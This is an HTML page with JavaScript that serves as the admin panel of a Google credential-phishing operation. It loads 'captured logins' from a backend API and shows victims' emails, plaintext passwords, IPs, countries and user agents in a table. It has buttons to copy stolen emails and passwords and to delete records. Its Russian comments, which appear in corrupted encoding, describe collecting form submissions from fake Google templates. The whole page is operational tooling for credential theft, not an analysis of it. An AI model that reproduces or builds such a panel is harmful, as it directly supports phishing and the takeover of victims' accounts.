<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Google Auth ‚Äî Admin Panel</title>

  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description"
        content="Admin panel for viewing captured Google sign-ins." />

  <style>
    :root {
      --bg-main: #020814;
      --bg-header: #020814;
      --bg-card: #0b101c;
      --bg-card-soft: #111827;
      --accent: #ffb800;
      --accent-alt: #ff8a00;
      --accent-soft: rgba(255, 184, 0, .16);
      --accent-green: #22c55e;
      --accent-red: #f97316;
      --text-main: #ffffff;
      --text-soft: #e5e7eb;
      --text-muted: #9ca3af;
      --radius-xl: 26px;
      --radius-lg: 20px;
      --radius-full: 999px;
      --shadow-soft: 0 18px 70px rgba(0, 0, 0, 0.78);
      --font-main: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      --transition-fast: .2s ease;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: var(--font-main);
      background: radial-gradient(circle at top, #141b33 0%, #020814 55%, #00040a 100%);
      color: var(--text-main);
      -webkit-font-smoothing: antialiased;
    }

    a {
      color: inherit;
      text-decoration: none;
    }

    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .inner {
      width: min(1320px, 100% - 40px);
      margin: 0 auto;
    }

    /* HEADER */

    .header-wrap {
      position: sticky;
      top: 0;
      z-index: 50;
      backdrop-filter: blur(18px);
      background: radial-gradient(circle at top,
              rgba(0,0,0,0.88),
              rgba(2, 8, 20, 0.98));
      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 24px;
      padding: 10px 0 8px;
    }

    .logo-combo {
      display: inline-flex;
      align-items: center;
      gap: 10px;
    }

    .logo-mark {
      width: 34px;
      height: 34px;
      border-radius: 12px;
      background:
        radial-gradient(circle at 30% 0, rgba(255, 184, 0, 0.35), transparent),
        #040810;
      box-shadow:
        0 0 0 1px rgba(255, 184, 0, 0.22),
        0 0 18px rgba(255, 184, 0, 0.45);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: 900;
      letter-spacing: 0.18em;
    }

    .logo-text-block {
      display: flex;
      flex-direction: column;
      line-height: 1.05;
    }

    .logo-text-block .top-line {
      display: flex;
      gap: 4px;
      font-weight: 800;
      font-size: 14px;
      letter-spacing: 0.08em;
      color: var(--accent);
    }

    .logo-text-block .sub-line {
      font-size: 8px;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      color: #9ca3af;
    }

    .admin-badge {
      padding: 4px 10px;
      border-radius: var(--radius-full);
      border: 1px solid rgba(248,250,252,0.2);
      font-size: 9px;
      text-transform: uppercase;
      letter-spacing: 0.16em;
      color: var(--accent-red);
      background: rgba(15,23,42,0.92);
    }

    /* MAIN */

    main {
      padding: 18px 0 22px;
      flex: 1;
    }

    .section-title {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.18em;
      margin-bottom: 7px;
    }

    .section-title .bar {
      display: inline-block;
      width: 28px;
      height: 2px;
      background: var(--accent);
      margin-right: 7px;
      border-radius: 999px;
      vertical-align: middle;
    }

    .section-sub {
      font-size: 8.5px;
      color: var(--text-muted);
      max-width: 620px;
      margin-bottom: 14px;
    }

    .card {
      padding: 14px 14px 12px;
      border-radius: var(--radius-xl);
      background: var(--bg-card);
      border: 1px solid rgba(255,255,255,0.06);
      box-shadow: var(--shadow-soft);
    }

    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      margin-bottom: 8px;
    }

    .card-title {
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.16em;
      color: var(--text-soft);
    }

    .pill {
      font-size: 8px;
      padding: 4px 8px;
      border-radius: 999px;
      border: 1px solid rgba(148,163,253,0.4);
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.14em;
    }

    .btn-xs {
      padding: 4px 9px;
      border-radius: 999px;
      border: 1px solid rgba(148,163,253,0.4);
      background: rgba(15,23,42,0.96);
      font-size: 8px;
      text-transform: uppercase;
      letter-spacing: 0.14em;
      color: var(--text-soft);
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 4px;
      transition: all var(--transition-fast);
    }

    .btn-xs:hover {
      border-color: var(--accent);
      color: var(--accent);
      box-shadow: 0 0 14px rgba(0,0,0,1);
    }

    .btn-xs--danger {
      border-color: rgba(239,68,68,0.9);
      color: #fecaca;
    }

    .btn-xs--primary {
      border-color: rgba(34,197,94,0.9);
      color: #bbf7d0;
    }

    .btn-xs:disabled {
      opacity: 0.4;
      cursor: default;
      box-shadow: none;
    }

    .global-status {
      font-size: 8px;
      margin-top: 4px;
      color: var(--text-muted);
    }

    .global-status.ok {
      color: var(--accent-green);
    }

    .global-status.err {
      color: var(--accent-red);
    }

    .logs-wrapper {
      margin-top: 14px;
    }

    .logs-table {
      width: 100%;
      border-collapse: collapse;
      border-spacing: 0;
      margin-top: 4px;
      font-size: 9px;
    }

    .logs-table thead {
      background: rgba(15,23,42,0.9);
    }

    .logs-table th,
    .logs-table td {
      padding: 6px 8px;
      border-bottom: 1px solid rgba(31,41,55,0.9);
      text-align: left;
      vertical-align: top;
    }

    .logs-table th {
      font-weight: 600;
      color: var(--text-soft);
      text-transform: uppercase;
      letter-spacing: 0.12em;
      font-size: 8px;
      white-space: nowrap;
    }

    .logs-table tbody tr:nth-child(even) {
      background: rgba(15,23,42,0.78);
    }

    .logs-table tbody tr:nth-child(odd) {
      background: rgba(15,23,42,0.96);
    }

    .logs-table td.actions-cell {
      white-space: nowrap;
    }

    .mono {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 9px;
    }

    .chip {
      display: inline-flex;
      align-items: center;
      padding: 2px 6px;
      border-radius: 999px;
      border: 1px solid rgba(55,65,81,0.9);
      background: rgba(15,23,42,0.7);
      font-size: 8px;
      color: var(--text-muted);
      margin-right: 4px;
      margin-bottom: 2px;
    }

    .chip-label {
      text-transform: uppercase;
      letter-spacing: .12em;
      font-size: 7px;
      margin-right: 4px;
      color: #6b7280;
    }

    .footer {
      margin-top: 18px;
      padding: 12px 0 18px;
      font-size: 8px;
      color: var(--text-muted);
      text-align: center;
      border-top: 1px solid rgba(255, 255, 255, 0.06);
      background: radial-gradient(circle at top,
              rgba(255,184,0,0.03),
              transparent);
    }

    @media (max-width: 900px) {
      .logs-table {
        font-size: 8px;
      }
      .logs-table th:nth-child(4),
      .logs-table td:nth-child(4) {
        display: none; /* –ø—Ä—è—á–µ–º UA –Ω–∞ –æ—á–µ–Ω—å —É–∑–∫–∏—Ö —ç–∫—Ä–∞–Ω–∞—Ö */
      }
    }

  </style>
</head>
<body>
<div class="page">

  <!-- HEADER -->
  <div class="header-wrap">
    <div class="inner header">
      <div class="logo-combo">
        <div class="logo-mark">GA</div>
        <div class="logo-text-block">
          <div class="top-line">
            <span>GOOGLE</span>
            <span>AUTH</span>
          </div>
          <div class="sub-line">CAPTURE ADMIN</div>
        </div>
      </div>

      <div class="admin-badge">
        INTERNAL PANEL ‚Ä¢ PRIVATE ACCESS
      </div>
    </div>
  </div>

  <!-- MAIN -->
  <main>
    <div class="inner">
      <section>
        <div class="section-title">
          <span class="bar"></span>Captured logins
        </div>
        <div class="section-sub">
          –ó–¥–µ—Å—å –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –≤—Å–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã (email / password) –∏–∑ Google-—à–∞–±–ª–æ–Ω–æ–≤.
          –°–≤–µ—Ä—Ö—É –≤–∏–¥–Ω–æ –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø–∏—Å–µ–π, –º–æ–∂–Ω–æ —É–¥–∞–ª—è—Ç—å –ø–æ –æ–¥–Ω–æ–π –∏–ª–∏ –ø–æ–¥—á–∏—Å—Ç–∏—Ç—å –≤—Å—ë
          —á–µ—Ä–µ–∑ <strong>Delete all</strong>. –ù–∏–∫–∞–∫–∏—Ö –∞–≤—Ç–æ-–¥–µ–π—Å—Ç–≤–∏–π ‚Äî —Ç–æ–ª—å–∫–æ —Ä—É—á–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ.
        </div>

        <div class="card">
          <div class="card-header">
            <div class="card-title">Stored records</div>
            <div style="display:flex;align-items:center;gap:8px;">
              <span class="pill" id="logs-count-pill">0 items</span>
              <button class="btn-xs btn-xs--danger" id="delete-all-btn">
                üóë Delete all
              </button>
            </div>
          </div>

          <div id="global-status" class="global-status"></div>

          <div class="logs-wrapper">
            <table class="logs-table">
              <thead>
              <tr>
                <th>#</th>
                <th>Email</th>
                <th>Password</th>
                <th>User agent</th>
                <th>Meta</th>
                <th>Created</th>
                <th></th>
              </tr>
              </thead>
              <tbody id="logs-tbody">
              <!-- rows inject here -->
              </tbody>
            </table>
          </div>
        </div>

      </section>
    </div>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    GOOGLE AUTH PANEL ‚Äî internal view for captured data. Keep this page private.
  </footer>
</div>

<script>
  // ===== CONFIG: –ø–æ–¥ —Å–µ–±—è –º–µ–Ω—è–µ—à—å URL'—ã =====
  const API_BASE = "/admin/api";
  const LIST_URL = API_BASE + "/creds";          // GET  -> { items: [...] }
  const DELETE_URL = API_BASE + "/creds/delete"; // POST -> { id }
  const DELETE_ALL_URL = API_BASE + "/creds/delete-all"; // POST -> {}

  const tbodyEl = document.getElementById("logs-tbody");
  const countPill = document.getElementById("logs-count-pill");
  const globalStatusEl = document.getElementById("global-status");
  const deleteAllBtn = document.getElementById("delete-all-btn");

  function setStatus(text, type) {
    globalStatusEl.textContent = text || "";
    globalStatusEl.className = "global-status" + (type ? " " + type : "");
  }

  function formatDate(iso) {
    if (!iso) return "";
    const d = new Date(iso);
    if (isNaN(d.getTime())) return iso;
    const date = d.toLocaleDateString("en-GB", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric"
    });
    const time = d.toLocaleTimeString("en-GB", {
      hour: "2-digit",
      minute: "2-digit"
    });
    return date + " " + time;
  }

  async function getJSON(url) {
    const res = await fetch(url, { credentials: "same-origin" });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  }

  async function postJSON(url, payload) {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "same-origin",
      body: JSON.stringify(payload || {})
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    try { return await res.json(); } catch { return {}; }
  }

  function renderRows(items) {
    if (!items || items.length === 0) {
      tbodyEl.innerHTML = `
        <tr>
          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
            No records yet.
          </td>
        </tr>`;
      countPill.textContent = "0 items";
      return;
    }

    // —Å–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –¥–∞—Ç–µ (–Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É), –µ—Å–ª–∏ –µ—Å—Ç—å createdAt
    items.sort((a, b) => {
      const da = new Date(a.createdAt || 0).getTime();
      const db = new Date(b.createdAt || 0).getTime();
      return db - da;
    });

    countPill.textContent = items.length + (items.length === 1 ? " item" : " items");

    const rows = items.map((item, idx) => {
      const id = item.id ?? item.pk ?? idx;
      const email = item.email || "";
      const password = item.password || item.pass || "";
      const ua = item.userAgent || item.ua || "";
      const ip = item.ip || item.ip_address || "";
      const country = item.country || item.geoCountry || "";
      const created = formatDate(item.createdAt || item.created_at || item.timestamp);

      const metaChips = [];
      if (ip)      metaChips.push(`<span class="chip"><span class="chip-label">IP</span><span class="mono">${ip}</span></span>`);
      if (country) metaChips.push(`<span class="chip"><span class="chip-label">CTRY</span>${country}</span>`);
      if (item.note) metaChips.push(`<span class="chip"><span class="chip-label">NOTE</span>${item.note}</span>`);

      return `
        <tr data-id="${id}">
          <td>${idx + 1}</td>
          <td class="mono">${email || "‚Äî"}</td>
          <td class="mono">${password || "‚Äî"}</td>
          <td style="max-width:260px;word-break:break-all;">
            <span class="mono">${ua || "‚Äî"}</span>
          </td>
          <td>${metaChips.join(" ") || "‚Äî"}</td>
          <td>${created || "‚Äî"}</td>
          <td class="actions-cell">
            <button class="btn-xs btn-xs--primary"
                    data-action="copy"
                    data-field="email"
                    data-id="${id}">
              üìã Email
            </button>
            <button class="btn-xs btn-xs--primary"
                    data-action="copy"
                    data-field="password"
                    data-id="${id}">
              üìã Pass
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="delete"
                    data-id="${id}">
              üóë
            </button>
          </td>
        </tr>
      `;
    }).join("");

    tbodyEl.innerHTML = rows;
  }

  async function loadLogs() {
    setStatus("Loading records‚Ä¶", "");
    try {
      const data = await getJSON(LIST_URL);
      const items = Array.isArray(data) ? data : (data.items || []);
      renderRows(items);
      setStatus("Loaded.", "ok");
    } catch (e) {
      console.error(e);
      setStatus("Failed to load records. Check " + LIST_URL, "err");
      tbodyEl.innerHTML = `
        <tr>
          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
            Error loading data.
          </td>
        </tr>`;
      countPill.textContent = "0 items";
    }
  }

  async function deleteOne(id) {
    if (!confirm("Delete this record? This cannot be undone.")) return;
    setStatus("Deleting record #" + id + "‚Ä¶", "");
    try {
      await postJSON(DELETE_URL, { id });
      setStatus("Record deleted.", "ok");
      await loadLogs();
    } catch (e) {
      console.error(e);
      setStatus("Failed to delete record. Check backend.", "err");
    }
  }

  async function deleteAll() {
    if (!confirm("Delete ALL records? This cannot be undone.")) return;
    setStatus("Deleting all records‚Ä¶", "");
    try {
      await postJSON(DELETE_ALL_URL, {});
      setStatus("All records deleted.", "ok");
      await loadLogs();
    } catch (e) {
      console.error(e);
      setStatus("Failed to delete all records. Check backend.", "err");
    }
  }

  function findRowData(id) {
    // –≤ —Ä–µ–∞–ª—å–Ω–æ–π –∂–∏–∑–Ω–∏ —É–¥–æ–±–Ω–µ–µ —Ö—Ä–∞–Ω–∏—Ç—å items –≤ –º–∞—Å—Å–∏–≤–µ –≤ JS,
    // –Ω–æ —Ç—É—Ç –º—ã –ø—Ä–æ—Å—Ç–æ —á–∏—Ç–∞–µ–º –ø—Ä—è–º–æ –∏–∑ DOM
    const row = tbodyEl.querySelector(`tr[data-id="${id}"]`);
    if (!row) return {};
    const cells = row.children;
    return {
      email: cells[1]?.textContent.trim() || "",
      password: cells[2]?.textContent.trim() || ""
    };
  }

  async function copyField(id, field) {
    const data = findRowData(id);
    const value = data[field] || "";
    if (!value) return;
    try {
      await navigator.clipboard.writeText(value);
      setStatus(field + " copied to clipboard.", "ok");
    } catch (e) {
      console.error(e);
      setStatus("Failed to copy to clipboard.", "err");
    }
  }

  // –¥–µ–ª–µ–≥–∏—Ä—É–µ–º –∫–ª–∏–∫–∏ –ø–æ —Ç–∞–±–ª–∏—Ü–µ
  tbodyEl.addEventListener("click", (e) => {
    const btn = e.target.closest("button[data-action]");
    if (!btn) return;
    const action = btn.getAttribute("data-action");
    const id = btn.getAttribute("data-id");
    if (!action || !id) return;

    if (action === "delete") {
      deleteOne(id);
    } else if (action === "copy") {
      const field = btn.getAttribute("data-field");
      copyField(id, field);
    }
  });

  deleteAllBtn.addEventListener("click", () => {
    deleteAll();
  });

  // —Å—Ç–∞—Ä—Ç
  loadLogs();
</script>

</body>
</html>
